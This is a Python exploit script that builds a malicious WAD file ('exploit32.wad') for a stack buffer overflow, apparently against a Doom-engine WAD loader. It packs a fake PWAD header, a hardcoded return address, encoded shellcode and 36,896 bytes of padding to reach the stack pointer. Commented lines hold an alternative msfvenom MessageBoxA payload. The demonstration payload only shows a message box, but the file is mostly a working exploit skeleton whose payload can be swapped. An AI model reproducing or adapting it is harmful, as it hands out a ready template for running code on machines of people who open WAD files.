#!/usr/bin/python
# -*- coding: utf8 -*-

#payload : MessageBoxA 'helo'
##############################
# NOT TESTED WITH NX OR ASLR #
##############################

#32bit exploitation attempts weeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
#same skeleton, payload below will not work due to 64b payload (i think)
from struct import *

buf =  "PWADx"
buf += bytearray('\x00\x00\x00')
buf += "xx"
buf += bytearray('\x00\x00')
buf += pack("<I", 0x19f36c)
buf += pack('<IIII', 0x54c93148, 0xba49c3d9, 0x6add329c, 0xe8a156ba)
buf += pack('<IIII', 0x41665e41, 0xf5c0e681, 0x0f4923b1, 0x834906ae)
buf += pack('<IIII', 0x8b4d08c6, 0xc9ff483e, 0xcf54314d, 0xc985482e)
buf += pack('<IIII', 0x7a60f375, 0xbe4a8e5e, 0x329ce861, 0x06fb3b9c)
buf += pack('<IIII', 0x7abcba2a, 0x1eea1856, 0x78d65fae, 0x1e735b90)
buf += pack('<IIII', 0x0e302890, 0x7ab816bc, 0xfb5da981, 0x97bb2bd0)
buf += pack('<IIII', 0x73ce0543, 0x0431228c, 0x0ede6381, 0xdd6a6b95)
buf += pack('<IIII', 0x329c6021, 0x963f22dd, 0x33d48fd5, 0x1e313a0d)
buf += pack('<IIII', 0x7217acb9, 0x86bb23fd, 0xcdd4be42, 0x62312b14)
buf += pack('<IIII', 0xe49da029, 0x1e735b90, 0x73302890, 0x17b7a31c)
buf += pack('<IIII', 0xd2a429a0, 0x55f69ba8, 0x7794cced, 0x8ecfbbe4)
buf += pack('<IIII', 0x7217acf9, 0x86bb23f9, 0x3e17a9c7, 0x16312e95)
buf += pack('<IIII', 0xe29da1bd, 0xdebee19c, 0x734ce9e9, 0x08e22b85)
buf += pack('<IIII', 0x6addb2f8, 0x0cfb339c, 0x12706be9, 0xb645389c)
buf += pack('<IIII', 0x68c5a9f9, 0xbfa8e195, 0xcd6317f6, 0x57002280)
buf += pack('<IIII', 0x329ce8a1, 0x1eba6add, 0x339d652c, 0xecfb6add)
buf += pack('<IIII', 0xb5f36390, 0xa601bf22, 0x73ca4a14, 0xeb2fcc67)
buf += pack('<IIII', 0x7a49173c, 0x6a92ae5e, 0xb29694a7, 0x53cf8a26)
buf += pack('<IIII', 0x408faf1a, 0x0fba00b2, 0xcd4661e0, 0x3adb0908)
buf += pack('<III',  0x4af9c6c2, 0xae9b6ab8, 0x000071eb) 
buf += "A" * 36896 #offset of $esp


f = open("exploit32.wad", "w")
f.write(buf)

#MessageBoxA 'helo' from msfvenom (replace payload above)
#0x18b8ceda, 0xd911c36c, 0x5bf42474, 0x41b1c931, 0x83184331, 0x430304c3, 0xc8368e0c, 0x9f60d5c7,
#0xb2a31e33, 0xfbf5a989, 0xcb87de89, 0xa76b97da, 0xf1ff4baa, 0xdd81ff5a, 0x5145c9d1, 0x344540fd,
#0x26567bfc, 0x8dc5f09e, 0xf2538c7a, 0x7273c609, 0xc8080d0c, 0xed555a16, 0xd989b727, 0xa97acc6e,
#0x52b33c71, 0x00480040, 0x5ec54026, 0x602b8ee7, 0x59c0fb20, 0xeb00d8d2, 0x370baacb, 0xbccd460a,
#0x9999d300, 0x9676e204, 0x41896f30, 0x8dae2bb1, 0xa51c70a0, 0x53e8a30b, 0x158389c2, 0x78b8039a,
#0x82bf83ca, 0x797a35f5, 0x635d38b2, 0x404143b7, 0x77f4a465, 0xcd80cb76, 0xa1ff5c80, 0x0a97ddb0,
#0x0503f382, 0xa7a97897, 0x14b9a467, 0x423350a3, 0x8f169bfd, 0x34c9a688, 0xf6a78422, 0x5513d5b5,
#0xa6a4ba51, 0x21342d5e, 0xb0a28ef8, 0x5b70ab9f, 0xe8065112, 0x5260429d, 0x88f87ef9, 0x6eda2769,
#0x0a72bf49, 0x1db250e5, 0x9990e27d, 0x73e91af4, 0x265b8e54, 0x066de0a7, 0x8edbfe07